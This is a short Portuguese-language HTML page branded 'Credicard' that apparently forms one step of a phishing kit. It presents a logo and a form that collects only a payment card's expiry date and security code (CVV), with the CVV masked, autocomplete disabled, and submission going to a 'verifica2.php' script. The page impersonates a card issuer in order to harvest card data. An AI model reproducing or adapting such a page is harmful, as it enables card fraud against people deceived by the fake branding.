<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/estilo.css">
 
    <title>Credicard</title>
</head>
<body>
    
<div id="logo"><img src="imagens/logo.png" height="34" width="260"></div>
<div id="container">
    <div id="form">
        <form action="verifica2.php" autocomplete="off" method="post">      
          <label for="">validade</label>
        <input type="tel" name="val" onkeydown="mascara('##/##',this,event,true)" maxlength="5">
        <label for="">codigo segurança</label>

        <input type="number" pattern="[0-9]*" inputmode="numeric" name="cvv2" id="" maxlength="4" onkeyup="somenteNumeros(this);" style="-webkit-text-security: disc;" autofocus onKeyPress="if(this.value.length==4) return false;">
        <input type="submit" value="acessar">
        </form>

    </div>
</div>

<script src="js/mascara.js"></script>
</body>
</html>